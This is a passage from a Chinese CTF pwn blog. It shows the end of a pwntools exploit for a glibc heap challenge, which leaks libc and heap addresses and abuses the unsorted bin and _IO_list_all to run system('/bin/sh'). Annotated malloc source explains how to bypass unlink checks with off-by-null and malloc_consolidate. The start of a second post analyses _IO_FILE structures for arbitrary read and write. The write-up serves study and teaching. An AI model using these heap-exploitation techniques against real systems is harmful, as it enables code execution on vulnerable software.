class="line"></span><br><span class="line">malloc_consolidate()</span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'\n'</span>)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">a.recvuntil(<span class="string">": "</span>)</span><br><span class="line">libc_base=u64(a.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-88</span>-libc.symbols[<span class="string">"__malloc_hook"</span>]<span class="number">-0x10</span></span><br><span class="line">success(<span class="string">"libc_base ==&gt; 0x%x"</span>%libc_base)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'\n'</span>)<span class="comment">#6 = 3</span></span><br><span class="line">add(<span class="number">0x28</span>,p64(<span class="number">0x41</span>)*<span class="number">3</span>+<span class="string">'\n'</span>)<span class="comment">#12  ,unsorted bin ==&gt; 0x110</span></span><br><span class="line">delete(<span class="number">12</span>) </span><br><span class="line">delete(<span class="number">6</span>) <span class="comment">#fd ==&gt; chunk4(chunk11)</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">a.recvuntil(<span class="string">": "</span>)</span><br><span class="line">heap_base=u64(a.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0xd0</span><span class="number">-0x10</span></span><br><span class="line">success(<span class="string">"heap_base ==&gt; 0x%x"</span>%heap_base)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">io_list_all=libc_base+libc.symbols[<span class="string">"_IO_list_all"</span>]</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=<span class="string">'/bin/sh\x00'</span>+p64(<span class="number">0x61</span>)   <span class="comment"># unsorted bin prev_size ,size </span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(io_list_all<span class="number">-0x10</span>)+<span class="string">'\n'</span></span><br><span class="line">add(<span class="number">0x38</span>,payload)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">system_addr=libc.symbols[<span class="string">"system"</span>]+libc_base</span><br><span class="line">payload=<span class="string">'\x00'</span>*<span class="number">0x18</span>+p64(heap_base+<span class="number">0x1e8</span>)+p64(system_addr)*<span class="number">3</span>+<span class="string">'\n'</span></span><br><span class="line">add(<span class="number">0x38</span>,payload)</span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">a.recv()</span><br><span class="line">a.sendline(<span class="string">"1"</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p>
<h5 id="创造last-remainder-绕过unlink检查"><a href="#创造last-remainder-绕过unlink检查" class="headerlink" title="创造last_remainder,绕过unlink检查"></a>创造last_remainder,绕过unlink检查</h5><p>刚开始写exp时，使用offbyNULL是这样的:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"><span class="function"><span class="title">malloc_consolidate</span><span class="params">()</span></span> <span class="comment">//合并，放入unsored bin中，由于申请了large bin，遍历unsored bin的时候放入了small bin</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0</span>x38,<span class="string">'\x00'</span>*<span class="number">0</span>x38)</span></span></span><br></pre></td></tr></table></figure></p>
<p>使用预留的chunk0，free他然后再申请到他，来造成offbyNULL，溢出其size位。<br>但是这样溢出后，再申请chunk就会挂掉。原因是：后面遍历small bin的时候，切割操作会触发unlink操作。<br>unlink会检查nextchunk的prev_size是否和将要unlink的chunk的size相同，但是溢出后size变小，nextchunk的prev_size并没有设置，所以会报错:</p>
<p>遍历完unsorted bin后，遍历bin，将bin中的chunk取出：<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">size</span> = chunksize (victim);</span><br><span class="line">        <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">        assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line">        remainder_size = <span class="built_in">size</span> - nb;</span><br><span class="line">        <span class="comment">/* unlink */</span></span><br><span class="line">        unlink (av, victim, bck, fwd); <span class="comment">//这里会触发unlink操作</span></span><br><span class="line">        <span class="comment">/* Exhaust */</span></span><br><span class="line">        <span class="built_in">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">          &#123;</span><br><span class="line">            set_inuse_bit_at_offset (victim, <span class="built_in">size</span>);</span><br><span class="line">            <span class="built_in">if</span> (av != &amp;main_arena)</span><br><span class="line">              victim-&gt;<span class="built_in">size</span> |= NON_MAIN_ARENA;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="comment">/* Split */</span></span><br><span class="line">        <span class="built_in">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            remainder = chunk_at_offset (victim, nb);</span><br><span class="line">     ......</span><br></pre></td></tr></table></figure></p>
<p>unlink:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      <span class="selector-tag">malloc_printerr</span> (<span class="string">"corrupted size vs. prev_size"</span>);</span><br></pre></td></tr></table></figure></p>
<hr>
<p>原wp的解决办法是从small chunk中申请一个chunk，申请完该chunk后，剩下的chunk就变成了last_remainder，放入了unsored bin中.<br>再利用这个新申请的chunk来溢出剩下的chunk。从last_remainder中分割chunk的时候不会unlink，就没有nextchunk的prev_size的检查了：<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;                  <span class="comment">// 申请的chunk属于small chunk    </span></span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;   <span class="comment">//unsorted bin中只有last_remainder，              </span></span><br><span class="line">              <span class="function"><span class="title">victim</span> == av-&gt;</span>last_remainder &amp;&amp;  <span class="comment">//且其size满足要求，就会进入以下分支 </span></span><br><span class="line">              (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              <span class="function"><span class="title">unsorted_chunks</span> (av)-&gt;</span><span class="function"><span class="title">bk</span> = unsorted_chunks (av)-&gt;</span>fd = remainder;</span><br><span class="line">              <span class="function"><span class="title">av</span>-&gt;</span>last_remainder = remainder;</span><br><span class="line">              <span class="function"><span class="title">remainder</span>-&gt;</span><span class="function"><span class="title">bk</span> = remainder-&gt;</span>fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="function"><span class="title">remainder</span>-&gt;</span>fd_nextsize = NULL;</span><br><span class="line">                  <span class="function"><span class="title">remainder</span>-&gt;</span>bk_nextsize = NULL;</span><br><span class="line">                &#125;</span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              void *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              return p;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></p>
<h5 id="利用malloc-consolidate设置prev-size绕过unlink检查"><a href="#利用malloc-consolidate设置prev-size绕过unlink检查" class="headerlink" title="利用malloc_consolidate设置prev_size绕过unlink检查."></a>利用malloc_consolidate设置prev_size绕过unlink检查.</h5><p>由于属于fastbin的chunk在free的时候不会进行前后的合并操作，所以要构成NULL_byte_poison的效果就需要借助malloc_consolidate.利用他的前向合并操作.<br>但是合并的时候会进行unlink，需要一个小trick:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0</span>x28,<span class="string">'\x00'</span>*<span class="number">0</span>x28)</span></span>#<span class="number">1</span>, <span class="number">0</span>x40, offbyNULL, unsorted chunksize <span class="number">0</span>x140 ==&gt; <span class="number">0</span>x100 </span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0</span>x38,<span class="string">'\n'</span>)</span></span>#<span class="number">2</span> <span class="number">0</span>x70</span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0</span>x38,<span class="string">'\n'</span>)</span></span>#<span class="number">3</span> <span class="number">0</span>xb0</span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0</span>x38,<span class="string">'\n'</span>)</span></span>#<span class="number">4</span> <span class="number">0</span>xf0</span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0</span>x18,<span class="string">'\n'</span>)</span></span>#<span class="number">5</span> <span class="number">0</span>x130</span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0</span>x18,<span class="string">'\n'</span>)</span></span>#<span class="number">11</span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">6</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">malloc_consolidate</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></p>
<p>注意delete的顺序:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">6</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">malloc_consolidate</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></p>
<p>先delete的chunk6，再delete的chunk2，顺序不能颠倒，此时fastbin的情况如下：<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fastbins</span>:</span><br><span class="line"><span class="number">0</span><span class="attribute">x20</span>: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span><span class="attribute">x30</span>: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span><span class="attribute">x40</span>: <span class="number">0</span>x555555757070 —▸ <span class="number">0</span>x555555757180 ◂— <span class="number">0</span>x0（chunk2 -&gt; chunk6）</span><br><span class="line"><span class="number">0</span><span class="attribute">x50</span>: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span><span class="attribute">x60</span>: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span><span class="attribute">x70</span>: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span><span class="attribute">x80</span>: <span class="number">0</span>x0</span><br></pre></td></tr></table></figure></p>
<p>fastbin头指向的是chunk2，那么malloc_consolidate就会先处理chunk2，先将chunk2移入到unsored bin中，同时设置好prev_size，然后再处理chunk6，chunk6的prev_size还是0x140,就会向前合并，合并成一个大chunk，这样就造成了chunk_overlap。因为将chunk2放入unsored bin中了，且设置好了prev_size，这样unlink的时候就不会报错了。</p>
<h5 id="申请chunk的时候设置好size。"><a href="#申请chunk的时候设置好size。" class="headerlink" title="申请chunk的时候设置好size。"></a>申请chunk的时候设置好size。</h5><p>因为题中申请内存的时候使用的是calloc，申请到chunk后就会将chunk的内容给清0，这样chunk overlap的时候就会将重叠的chunk的chunk_head给清零了，所以申请到chunk后，注意将chunk_head给还原了。不然free的时候会报错。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0</span>x28,p64(<span class="number">0</span>x41)</span></span>*<span class="number">3</span>+<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure></p>
<p>申请这个chunk的时候会把chunk4的size位给清0，所以要恢复size位，为后面的free chunk4做准备。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>以上即是我碰到的一些问题，主要就是malloc_consolidate的时候会进行unlink操作，而unlink操作会检查将要unlink的chunk的下一个chunk的prev_size位，需要精确安排来绕过。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/24/IO-FILE部分源码分析及利用/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ditto">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/my.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ditto's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/24/IO-FILE部分源码分析及利用/" itemprop="url">_IO_FILE部分源码分析及利用</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-24T11:13:36+08:00">
                2019-04-24
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  5.7k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  26
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <a id="more"></a>
<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>最近的题目(最近两年的国赛，HCTF2018)中出现了很多关于_IO_FILE的利用，不是house of orange中的伪造vtable，而是修改_IO_FILE结构体中的一些指针，达到任意读写的能力。<br>鉴于修改指针这方面的资料很少，只好自己读源码分析了。</p>
<h3 id="部分源码分析"><a href="#部分源码分析" class="headerlink" title="部分源码分析:"></a>部分源码分析:</h3><p>在linux系统中，打开文件的系统调用是open，当使用open函数打开一个文件后，会返回一个整数，这个整数就是文件描述符。<br>每个进程都有一个叫做task_struct的结构体（即PCB，process control block），用来保存进程的一些信息，这个结构体保存了<strong>文件描述符表</strong>指针，来记录该进程打开的文件。而文件描述符就是这个表的索引。<br>当程序启动后，会默认打开三个文件，stdin,stdout,stderr.分别为标准输入，标准输出，标准错误。对应的文件描述符是0,1,2.<br>linux下一切都当做文件对待，显示器，键盘等都当做文件，这里的标准输入对应的就是键盘，标准输出就是对应的显示器。</p>
<p>而c语言用一个指向_IO_FILE结构体的指针来操作其对应的文件，其中<strong>封装了文件描述符</strong>，这个FILE结构体中保存的有文件描述符，操作文件权限，<strong>_IO_缓冲区信息</strong>等。后面的任意读写漏洞就是出在了IO缓冲区这里。<br>当使用fopen函数打开一个文件后，会返回一个指向FILE结构体的指针。<br>如:<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FILE *<span class="built_in">fp</span><span class="comment">;</span></span><br><span class="line"><span class="built_in">fp</span>=fopen(<span class="string">"xxx"</span>,<span class="string">"r"</span>)</span><br></pre></td></tr></table></figure></p>
<h4 id="IO-FILE结构体："><a href="#IO-FILE结构体：" class="headerlink" title="_IO_FILE结构体："></a>_IO_FILE结构体：</h4><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">truct <span class="variable">_IO_FILE</span> &#123;</span><br><span class="line">  int <span class="variable">_flags</span>;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  char* <span class="variable">_IO_read_ptr</span>;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  char* <span class="variable">_IO_read_end</span>;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  char* <span class="variable">_IO_read_base</span>;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  char* <span class="variable">_IO_write_base</span>;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  char* <span class="variable">_IO_write_ptr</span>;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  char* <span class="variable">_IO_write_end</span>;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  char* <span class="variable">_IO_buf_base</span>;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  char* <span class="variable">_IO_buf_end</span>;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  char *<span class="variable">_IO_save_base</span>; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  char *<span class="variable">_IO_backup_base</span>;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  char *<span class="variable">_IO_save_end</span>; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line">  struct <span class="variable">_IO_marker</span> *<span class="variable">_markers</span>;</span><br><span class="line">  struct <span class="variable">_IO_FILE</span> *<span class="variable">_chain</span>;</span><br><span class="line">  int <span class="variable">_fileno</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  int <span class="variable">_blksize</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  int <span class="variable">_flags2</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="variable">_IO_off_t</span> <span class="variable">_old_offset</span>; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  unsigned short <span class="variable">_cur_column</span>;</span><br><span class="line">  signed char <span class="variable">_vtable_offset</span>;</span><br><span class="line">  char <span class="variable">_shortbuf</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  <span class="variable">_IO_lock_t</span> *<span class="variable">_lock</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct <span class="variable">_IO_FILE_complete</span></span><br><span class="line">&#123;</span><br><span class="line">  struct <span class="variable">_IO_FILE</span> <span class="variable">_file</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  <span class="variable">_IO_off64_t</span> <span class="variable">_offset</span>;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  struct <span class="variable">_IO_codecvt</span> *<span class="variable">_codecvt</span>;</span><br><span class="line">  struct <span class="variable">_IO_wide_data</span> *<span class="variable">_wide_data</span>;</span><br><span class="line">  struct <span class="variable">_IO_FILE</span> *<span class="variable">_freeres_list</span>;</span><br><span class="line">  void *<span class="variable">_freeres_buf</span>;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">  void *<span class="variable">__pad1</span>;</span><br><span class="line">  void *<span class="variable">__pad2</span>;</span><br><span class="line">  void *<span class="variable">__pad3</span>;</span><br><span class="line">  void *<span class="variable">__pad4</span>;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">  size_t <span class="variable">__pad5</span>;</span><br><span class="line">  int <span class="variable">_mode</span>;</span><br><span class="line">  <span class="comment">/* Make sure we don't get into trouble again.  */</span></span><br><span class="line">  char <span class="variable">_unused2</span>[<span class="number">15</span> * <span class="built_in">sizeof</span> (int) - <span class="number">4</span> * <span class="built_in">sizeof</span> (void *) - <span class="built_in">sizeof</span> (size_t)];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>FILE结构体中有很多指针，<strong>这里重点关注一下这些指针</strong>:<br><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">char</span>* _IO_read_ptr;	/* Current read pointer */</span><br><span class="line"><span class="built_in">char</span>* _IO_read_end;	/* <span class="keyword">End</span> <span class="keyword">of</span> <span class="keyword">get</span> area. */</span><br><span class="line"><span class="built_in">char</span>* _IO_read_base;	/* Start <span class="keyword">of</span> putback+<span class="keyword">get</span> area. */</span><br><span class="line"><span class="built_in">char</span>* _IO_write_base;	/* Start <span class="keyword">of</span> put area. */</span><br><span class="line"><span class="built_in">char</span>* _IO_write_ptr;	/* Current put pointer. */</span><br><span class="line"><span class="built_in">char</span>* _IO_write_end;	/* <span class="keyword">End</span> <span class="keyword">of</span> put area. */</span><br><span class="line"><span class="built_in">char</span>* _IO_buf_base;	/* Start <span class="keyword">of</span> reserve area. */</span><br><span class="line"><span class="built_in">char</span>* _IO_buf_end;	/* <span class="keyword">End</span> <span class="keyword">of</span> reserve area. */</span><br></pre></td></tr></table></figure></p>
<p>这些指针记录了IO缓冲区的位置，和当前的读写位置。<br>c语言为了提高效率，为IO提供了缓冲区（这些缓冲区是默认分配在堆中的，也可以使用setbuf，setvbuf函数将输入输出与特定的缓存区相联系），<strong>当第一次对文件读的时候，会以页为单位，将文件中的内容读取到缓冲区中，以供程序后来的使用，避免了多次系统调用，降低了效率(用户态和内核态的切换的消耗很大)。同理，对文件进行写操作的时候，其实是先在缓冲区中写</strong>。如果修改这些指针，则可以达到任意读写的能力，但是需要搞清楚glibc是如何使用这些指针的。</p>
<p><strong>注意使用缓冲区的情况是使用c标准库的文件操作函数，如果你使用系统调用write，read等函数，是不使用缓冲区的，他直接将内容写入到对应的文件中（或直接从对应的文件中读取），因为write，read函数是直接使用文件描述符的，并不使用FILE结构。</strong></p>
<p>pwn的题目通常都会setbuf，setvbuf，取消缓冲区，防止缓冲区没有满，没有输出的情况。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br></pre></td></tr></table></figure>
<p>这个指针指向下个FILE结构，所有的FILE结构体是使用单向链表串起来的，链表头是_IO_list_all.<br>如图所示：<br><img src="https://github.com/Dittozzz/CTF-pwn-writeup/blob/master/_IO_FILE%E9%83%A8%E5%88%86%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1.png?raw=true" alt=""></p>
<h4 id="IO-FILE-plus结构体："><a href="#IO-FILE-plus结构体：" class="headerlink" title="_IO_FILE_plus结构体："></a>_IO_FILE_plus结构体：</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>_IO_FILE_plus结构体只是对_IO_FILE结构体进行了封装，增加了一个新成员：vtable，这个和c++里的vtable很像。其实fopen返回的是_IO_FILE_plus类型的指针。<br>vtable是指向_IO_jump_t结构体类型的指针，_IO_jumpt_t结构体的定义如下：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_jump_t</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">JUMP_FIELD(size_t, </span>__dummy)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(size_t, </span>__dummy2)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_finish_t, </span>__finish)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_overflow_t, </span>__overflow)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_underflow_t, </span>__underflow)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_underflow_t, </span>__uflow)<span 